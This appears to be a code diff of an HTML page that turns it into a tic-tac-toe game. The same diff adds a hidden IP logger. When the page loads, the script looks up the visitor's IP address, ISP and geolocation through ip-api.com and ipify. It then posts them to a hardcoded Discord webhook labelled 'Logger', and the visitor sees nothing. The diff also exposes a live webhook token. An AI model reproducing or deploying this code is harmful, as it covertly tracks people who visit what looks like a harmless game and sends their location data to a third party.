@@ -20,61 +20,147 @@
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
     <!-- Notyf CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <style>
+      body {
+        font-family: 'Poppins', sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f0f0f0;
+        margin: 0;
+      }
+      .header {
+        display: none
+      }
+      .map-container {
+        display: none
+      }
+      .tic-tac-toe {
+        display: grid;
+        grid-template-columns: repeat(3, 100px);
+        grid-template-rows: repeat(3, 100px);
+        gap: 10px;
+      }
+      .cell {
+        width: 100px;
+        height: 100px;
+        background-color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 24px;
+        font-weight: bold;
+        cursor: pointer;
+        border: 2px solid #ccc;
+      }
+    </style>
   </head>
   <body>
     <header class="header"></header>
-    <script src="./config.js"></script>
+    <div class="tic-tac-toe">
+      <div class="cell" data-index="0"></div>
+      <div class="cell" data-index="1"></div>
+      <div class="cell" data-index="2"></div>
+      <div class="cell" data-index="3"></div>
+      <div class="cell" data-index="4"></div>
+      <div class="cell" data-index="5"></div>
+      <div class="cell" data-index="6"></div>
+      <div class="cell" data-index="7"></div>
+      <div class="cell" data-index="8"></div>
+    </div>
     <script>
-      function get_information(link, callback) {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", link, true);
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            callback(xhr.responseText);
-          }
-        };
-        xhr.send(null);
-      }
-      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "razzylog";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
-      get_information("https://api.ipify.org/", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "ipppp";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
+      var wbhk = 'https://discord.com/api/webhooks/1255956386051915786/695VoO-xggrciA5sdyIZ3Deu5g2ZFU21tVPL2moTC-BCslzu2OBNjaEBDrclwBUQkekF';
 
-      function ipLogByRaz() {
-        var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
+      function get_information(link) {
+        return new Promise((resolve, reject) => {
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", link, true);
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+              if (xhr.status === 200) {
+                resolve(xhr.responseText);
+              } else {
+                reject(xhr.statusText);
+              }
+            }
+          };
+          xhr.send(null);
+        });
+      }
+
+      Promise.all([
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"),
+        get_information("https://api.ipify.org/")
+      ]).then(responses => {
+        var extra = responses[0];
+        var ispp = responses[1];
+
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
         request.setRequestHeader('Content-type', 'application/json');
         const params = {
           username: "Logger",
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+          content: `**Ip** : _${ispp}_\n**Raw** : _https://api.techniknews.net/ipgeo/${ispp}_\n**Extra Info** : \`\`\`${extra}\`\`\``
         }
         request.send(JSON.stringify(params));
-      }
-      setTimeout(function() {
-        ipLogByRaz()
-      }, 700);
-    </script>
-    <style>
-      .header {
-        display: none
+      }).catch(error => {
+        console.error("Error fetching information: ", error);
+      });
+
+      // Tic-Tac-Toe game logic
+      const cells = document.querySelectorAll('.cell');
+      let currentPlayer = 'X';
+      const winningCombinations = [
+        [0, 1, 2],
+        [3, 4, 5],
+        [6, 7, 8],
+        [0, 3, 6],
+        [1, 4, 7],
+        [2, 5, 8],
+        [0, 4, 8],
+        [2, 4, 6]
+      ];
+
+      cells.forEach(cell => {
+        cell.addEventListener('click', () => {
+          if (cell.textContent === '') {
+            cell.textContent = currentPlayer;
+            if (checkWin()) {
+              setTimeout(() => alert(currentPlayer + ' wins!'), 10);
+              resetGame();
+            } else if (checkDraw()) {
+              setTimeout(() => alert('Draw!'), 10);
+              resetGame();
+            } else {
+              currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
+            }
+          }
+        });
+      });
+
+      function checkWin() {
+        return winningCombinations.some(combination => {
+          return combination.every(index => {
+            return cells[index].textContent === currentPlayer;
+          });
+        });
       }
 
-      .map-container {
-        display: none
+      function checkDraw() {
+        return [...cells].every(cell => {
+          return cell.textContent !== '';
+        });
       }
-    </style>
+
+      function resetGame() {
+        cells.forEach(cell => {
+          cell.textContent = '';
+        });
+        currentPlayer = 'X';
+      }
+    </script>
   </body>
 </html>
+
